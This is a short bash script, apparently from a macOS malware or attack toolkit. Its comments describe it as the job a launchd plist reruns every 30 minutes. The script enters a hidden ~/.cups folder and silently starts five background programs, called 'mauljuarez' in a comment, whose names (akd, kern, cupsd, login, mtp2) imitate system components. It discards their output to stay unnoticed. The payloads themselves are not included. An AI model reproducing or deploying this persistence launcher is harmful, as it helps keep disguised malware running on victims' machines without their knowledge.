#!/bin/bash

# this is the file that the plist "cronjob" should run.
# Put stuff in here that you want to run over and over again. 
# Default in the plist is set to 1800 seconds, or 30 minutes.
USERNAME=`/usr/bin/whoami`

# recon
cd /Users/$USERNAME/.cups

# Run your mauljuarez, dump stderror and stdout
/Users/$USERNAME/.cups/akd 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/kern 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/cupsd 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/login 2>&1>/dev/null &
/usr/bin/python /Users/$USERNAME/.cups/mtp2 2>&1>/dev/null &
